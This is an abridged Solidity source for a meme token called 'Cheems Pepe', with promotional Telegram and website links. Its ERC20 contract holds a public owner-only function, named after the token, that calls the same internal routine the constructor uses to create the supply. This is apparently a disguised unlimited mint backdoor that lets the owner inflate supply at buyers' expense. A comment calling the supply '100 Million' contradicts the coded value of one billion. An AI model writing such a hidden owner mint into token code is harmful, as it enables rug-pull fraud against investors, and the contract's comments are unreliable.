...
//
//
//   📱Telegram::https://t.me/+I7GPnmMOLGZiZjZl
//   📱Website ::https://Cheemspepe.space/
/*
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function CheemsPepe(uint256 amount) public onlyOwner {
    _CheemsPepe(msg.sender, amount);
    }
    ...
    function _CheemsPepe(address account, uint256 amount) internal virtual {
...
contract CheemsPepe is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Cheems Pepe", "CheemsPepe") {
        _CheemsPepe(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}
